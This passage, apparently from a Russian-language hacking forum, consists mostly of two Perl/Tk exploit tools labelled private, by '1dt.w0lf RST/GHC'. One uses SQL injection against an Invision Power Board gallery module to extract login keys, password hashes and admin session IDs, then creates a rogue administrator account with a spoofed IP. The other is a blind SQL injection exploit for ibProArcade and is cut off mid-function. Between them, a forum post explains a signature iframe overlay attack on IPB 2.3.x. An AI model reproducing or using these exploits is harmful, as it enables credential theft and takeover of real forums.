'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'Database tables prefix: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$prefix&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label &#40; -text =&gt; 'get data from database', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label &#40; -text =&gt; 'Get data from table: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $b2 = $fright-&gt;BrowseEntry&#40; -command =&gt; \&amp;update_columns, -relief =&gt; &quot;groove&quot;, -variable =&gt; \$table, -font =&gt; '&#123;Verdana&#125; 8'&#41;; $b2-&gt;insert&#40;&quot;end&quot;, &quot;members&quot;&#41;; $b2-&gt;insert&#40;&quot;end&quot;, &quot;members_converge&quot;&#41;; $b2-&gt;insert&#40;&quot;end&quot;, &quot;admin_sessions&quot;&#41;; $b2-&gt;insert&#40;&quot;end&quot;, &quot;validating&quot;&#41;; $b2-&gt;pack&#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w'&#41;; $fleft-&gt;Label &#40; -text =&gt; 'Get data from column: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $b = $fright-&gt;BrowseEntry&#40; -relief =&gt; &quot;groove&quot;, -variable =&gt; \$column, -font =&gt; '&#123;Verdana&#125; 8'&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;member_login_key&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;name&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;ip_address&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;legacy_password&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;email&quot;&#41;; $b-&gt;pack&#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41;; $fleft-&gt;Label &#40; -text =&gt; 'Returned data: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$report&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'create new admin', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label &#40; -text =&gt; 'session_id: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$session_id&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'session_ip_address: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$session_ip_address&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'new admin name: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$new_admin_name&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'new admin password: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$new_admin_password&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'new_admin_email: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$new_admin_email&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fright-&gt;Checkbutton&#40; -font =&gt; '&#123;Verdana&#125; 8', -text =&gt; 'Use custom profile fields', -variable =&gt; \$use_custom_fields&#41;-&gt;pack&#40;-side =&gt; &quot;top&quot; , -anchor =&gt; 'w'&#41;; $fleft-&gt;Label &#40; -text =&gt; 'custom fields: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$custom_fields&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Test forum vulnerability', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; \&amp;test_vuln &#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Get database tables prefix', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; \&amp;get_prefix &#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Get data from database', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; \&amp;get_data &#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Create new admin', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; \&amp;create_admin &#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; '+++ PRIV8 +++', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; '&#40;c&#41;oded by 1dt.w0lf', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; 'RST/GHC', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; MainLoop&#40;&#41;; sub update_columns&#40;&#41; &#123; $b-&gt;delete&#40;0,&quot;end&quot;&#41;; if&#40;$table eq 'members'&#41;&#123; $column = &quot;member_login_key&quot;; $b-&gt;insert&#40;&quot;end&quot;, &quot;member_login_key&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;name&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;ip_address&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;legacy_password&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;email&quot;&#41;; &#125; elsif&#40;$table eq 'members_converge'&#41;&#123; $column = &quot;converge_pass_hash&quot;; $b-&gt;insert&#40;&quot;end&quot;, &quot;converge_pass_hash&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;converge_pass_salt&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;converge_email&quot;&#41;; &#125; elsif&#40;$table eq 'admin_sessions'&#41;&#123; $column = &quot;session_id&quot;; $b-&gt;insert&#40;&quot;end&quot;, &quot;session_id&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;session_ip_address&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;session_member_name&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;session_member_id&quot;&#41;; &#125; elsif&#40;$table eq 'validating'&#41;&#123; $column = &quot;vid&quot;; $b-&gt;insert&#40;&quot;end&quot;, &quot;vid&quot;&#41;; &#125; &#125; sub get_data&#40;&#41; &#123; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'get data from database', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; if&#40;$table eq 'members'&#41; &#123; $id_text = 'id'; &#125; if&#40;$table eq 'members_converge'&#41; &#123; $id_text = 'converge_id'; &#125; if&#40;$table eq 'admin_sessions'&#41; &#123; $id_text = 'session_member_id'; &#125; if&#40;$table eq 'validating'&#41; &#123; $id_text = 'member_id'; &#125; $i = 1; $report = ''; while&#40;1&#41; &#123; $ret = get_char&#40;$i&#41;; if&#40;$ret == 0&#41; &#123; last; &#125; else &#123; $report .= chr&#40;$ret&#41;; $i++; $mw-&gt;update&#40;&#41;; &#125; &#125; if&#40;$report eq ''&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Can\'t get data', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; else &#123; if&#40;$column eq 'session_id'&#41; &#123; $session_id = $report; $mw-&gt;update&#40;&#41;; &#125; elsif&#40;$column eq 'session_ip_address'&#41; &#123; $session_ip_address = $report; $mw-&gt;update&#40;&#41;; &#125; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Done!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack; &#125; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; sub get_char&#40;&#41; &#123; $res = $xpl-&gt;get&#40;$url.&quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1 union select 1,ascii&#40;substring&#40;&quot;.$column.&quot;,&quot;.$_&#91;0&#93;.&quot;,1&#41;&#41;,1,1,1,1,1,1,1,1 FROM $prefix$table WHERE $id_text = $user_id&quot;&#41;; if&#40;$res-&gt;as_string =~ /cmd=user&amp;user=&#40;\d*&#41;&amp;op=view_album/&#41; &#123; $rep = $1; &#125; else &#123; $rep = 0; &#125; return $rep; &#125; sub create_admin&#40;&#41; &#123; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'create new admin', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; if&#40;$session_id eq '' |$session_ip_address eq ''&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'You need insert admin session_id and session_ip_address', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; &#125; elsif&#40;$session_ip_address !~ /\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'session_ip_address wrong!', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; &#125; else &#123; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; &#40;$url2 = $url&#41; =~ s/index.php/admin.php/; $cf = ''; %fields = &#40; 'code' =&gt; 'doadd', 'act' =&gt; 'mem', 'section' =&gt; 'content', 'name' =&gt; $new_admin_name, 'password' =&gt; $new_admin_password, 'email' =&gt; $new_admin_email, 'mgroup' =&gt; 4, ## default admin group , maybe need change &#41;; if&#40;$use_custom_fields&#41; &#123; @cf = split&#40;',',$custom_fields&#41;; foreach&#40;@cf&#41; &#123; &#40;$k,$v&#41; = split&#40;'=',$_&#41;; $fields&#123;$k&#125; = $v;&#125; &#125; $res = $xpl-&gt;post&#40;$url2.&quot;?adsess=$session_id&quot;, &#91; %fields, &#93;, 'USER_AGENT'=&gt;'', 'CLIENT_IP'=&gt;&quot;$session_ip_address&quot;, 'X_FORWARDED_FOR'=&gt;&quot;$session_ip_address&quot;&#41;; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Done!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'New admin created', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41;-&gt;pack; &#125; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; sub test_vuln&#40;&#41; &#123; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'test forum vulnerability', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $res = $xpl-&gt;get&#40;$url.&quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1 union select 1,11457,1,1,1,1,1,1,1,1/*&quot;&#41;; if&#40;$res-&gt;is_success&#41; &#123; $rep = ''; if&#40;$res-&gt;as_string =~ /cmd=user&amp;user=&#40;\d*&#41;&amp;op=view_album/&#41; &#123; $rep = $1; &#125; if&#40;$rep == 11457&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM VULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM UNVULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack; &#125; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $res-&gt;status_line, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; &#125; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; sub get_prefix&#40;&#41; &#123; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'get database tables prefix', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $res = $xpl-&gt;get&#40;$url.&quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1\\&quot;&#41;; if&#40;$res-&gt;is_success&#41; &#123; $rep = ''; if&#40;$res-&gt;as_string =~ /FROM &#40;.*&#41;gallery_albums/&#41; &#123; $prefix = $1; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Prefix: '.$prefix, -font =&gt; '&#123;Verdana&#125; 8 bold'&#41;-&gt;pack; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Can\'t get prefix', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $res-&gt;status_line, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; &#125; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; ||divir|unknown_user|Откуда:|127.0.0.1|Сообщения:|691||Вернуться к началу||Lenar|&raquo; 26 апр 2008 14:20 ||Invision Power Board &lt;=2.3.x iFrame Vulnerability|1)Регистрируемся 2)Заходим в свой профиль 3)Изменяем подпись(html включен): |Код: |Выделить всё|&lt;head&gt; &lt;title&gt;Заголовок&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;iFrame1&quot; style=&quot;position:absolute; left:0px; top:0px; z-index:0&quot;&gt; &lt;iframe name=&quot;iFrame1&quot; width=1024 height=3186 src=&quot;http://адрес Вашей страницы.html&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;|4)Постим сообщение- страница форума перекрывается Вашей страницей. |Добавлено спустя 9 минут 3 секунды:|ibProArcade &lt;= v3.3.0 sql injection exploit||Код: |Выделить всё|#!/usr/bin/perl ## ibProArcade &lt;= v3.3.0 sql injection exploit ## &#40;c&#41;oded by 1dt.w0lf ## RST/GHC ## THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE ## KEEP IT PRIVATE use Tk; use Tk::BrowseEntry; use Tk::DialogBox; use LWP::UserAgent; BEGIN &#123; if&#40;$^O eq 'MSWin32'&#41;&#123; require Win32::Console; Win32::Console::Free&#40;&#41;; &#125; &#125; $mw = new MainWindow&#40;title =&gt; &quot;r57ibProArcade&quot; &#41;; $mw-&gt;geometry &#40; '420x310' &#41; ; $mw-&gt;resizable&#40;0,0&#41;; $mw-&gt;Label&#40;-text =&gt; '!', -font =&gt; '&#123;Webdings&#125; 22'&#41;-&gt;pack&#40;&#41;; $mw-&gt;Label&#40;-text =&gt; 'ibProArcade sql injection exploit by RST/GHC', -font =&gt; '&#123;Verdana&#125; 7 bold',-foreground=&gt;'red'&#41;-&gt;pack&#40;&#41;; $mw-&gt;Label&#40;-text =&gt; ''&#41;-&gt;pack&#40;&#41;; $fleft=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'ne'&#41; ; $fright=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'nw'&#41; ; $url = 'http://127.0.0.1/ipb216/index.php'; $user_id = '1'; $prefix = 'ibf_'; $column = 'member_login_key'; $report = ''; $true = 0; $false = 0; $fleft-&gt;Label &#40; -text =&gt; 'Path to forum index: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $url&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'User ID: ', -font =&gt; '&#123;Verdana&#125; 8 bold' &#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $user_id&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'Database tables prefix: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $prefix&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label &#40; -text =&gt; 'get data from database', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label &#40; -text =&gt; 'Get data from column: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $b = $fright-&gt;BrowseEntry&#40; -relief =&gt; &quot;groove&quot;, -variable =&gt; $column, -font =&gt; '&#123;Verdana&#125; 8'&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;member_login_key&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;name&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;ip_address&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;legacy_password&quot;&#41;; $b-&gt;insert&#40;&quot;end&quot;, &quot;email&quot;&#41;; $b-&gt;pack&#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41;; $fleft-&gt;Label &#40; -text =&gt; 'Returned data: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $report&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Test forum vulnerability', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; &amp;test_vuln &#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Get database tables prefix', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; &amp;get_prefix &#41;-&gt;pack&#40;&#41;; $fright-&gt;Button&#40;-text =&gt; 'Get data from database', -relief =&gt; &quot;groove&quot;, -width =&gt; '30', -font =&gt; '&#123;Verdana&#125; 8 bold', -activeforeground =&gt; 'red', -command =&gt; &amp;get_data &#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; '+++ PRIV8 +++', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; '&#40;c&#41;oded by 1dt.w0lf', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; $fleft-&gt;Label&#40; -text =&gt; 'RST/GHC', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; MainLoop&#40;&#41;; sub get_data&#40;&#41; &#123; $true = &amp;get_true&#40;&#41;; $report = ''; $s_num=1; while&#40;&#40;$chr = &amp;found&#40;0,255&#41;&#41;!=0&#41;&#123; $report .= chr&#40;$chr&#41;; $mw-&gt;update&#40;&#41;; $s_num++; &#125; if&#40;length&#40;$report&#41; &gt; 0&#41; &#123; &amp;report&#40;'That\'s all ;&#41;'&#41;; &#125; else &#123; &amp;report&#40;'Can\'t get data from database'&#41;; &#125; &#125; sub test_vuln&#40;&#41; &#123; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'test forum vulnerability', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $true = &amp;get_true&#40;&#41;; $false = &amp;get_false&#40;&#41;; if&#40;$true != $false&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM VULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM UNVULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack; &#125; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; sub get_true&#40;&#41; &#123; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $res = $xpl-&gt;get&#40;$url.&quot;?autocom=arcade&amp;overwrite_sort=added&amp;overwrite_order=,&#40;-gid*&#40;1=1&#41;&#41;&quot;&#41;; if&#40;$res-&gt;as_string =~ /g=&#40;d+&#41;&quot; target=&quot;hiddenframe&quot;&gt;&lt;img src=&quot;./arcade/images/addfav.gif&quot;/&#41; &#123; $rep = $1; &#125; return $rep; &#125; sub get_false&#40;&#41; &#123; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $res = $xpl-&gt;get&#40;$url.&quot;?autocom=arcade&amp;overwrite_sort=added&amp;overwrite_order=,&#40;-gid*&#40;1=2&#41;&#41;&quot;&#41;; if&#40;$res-&gt;as_string =~ /g=&#40;\d+&#41;&quot; target=&quot;hiddenframe&quot;&gt;&lt;img src=&quot;.\/arcade\/images\/addfav.gif&quot;/&#41; &#123; $rep = $1; &#125; return $rep; &#125; sub get_prefix&#40;&#41; &#123; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'get database tables prefix', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $res = $xpl-&gt;get&#40;$url.&quot;?autocom=arcade&amp;overwrite_sort=added&amp;overwrite_order=r57r0x&quot;&#41;; if&#40;$res-&gt;is_success&#41; &#123; $rep = ''; if&#40;$res-&gt;as_string =~ /from &#40;.*&#41;games_list/&#41; &#123; $prefix = $1; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Prefix: '.$prefix, -font =&gt; '&#123;Verdana&#125; 8 bold'&#41;-&gt;pack; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Can\'t get prefix', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; &#125; else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $res-&gt;status_line, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; &#125; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; sub found&#40;$$&#41; &#123; my $fmin = $_&#91;0&#93;; my $fmax = $_&#91;1&#93;; if 